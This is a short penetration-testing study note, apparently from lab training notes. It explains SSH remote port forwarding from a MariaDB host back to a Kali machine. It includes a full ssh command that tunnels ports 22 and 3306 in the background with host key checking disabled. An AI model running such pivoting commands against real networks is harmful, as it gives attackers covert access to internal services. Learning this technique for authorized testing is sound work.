> [!info] 
> We open up port **1122** on Kali to point to port **22** on the MariaDB host. Next, we will also open **13306** on Kali to point to **3306** on the MariaDB host.
> 
> We need to add the **-N** flag to specify that we are not running any commands. We also need the **-f** option to request ssh to go to the background. Finally, we also need to provide the key file that we are using via **-i**. 

```
ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa chris@192.168.119.151
```

> [!note] 
>  You need to generate a [[keys]] (key-pair) first and add the public key to Kali before running the command above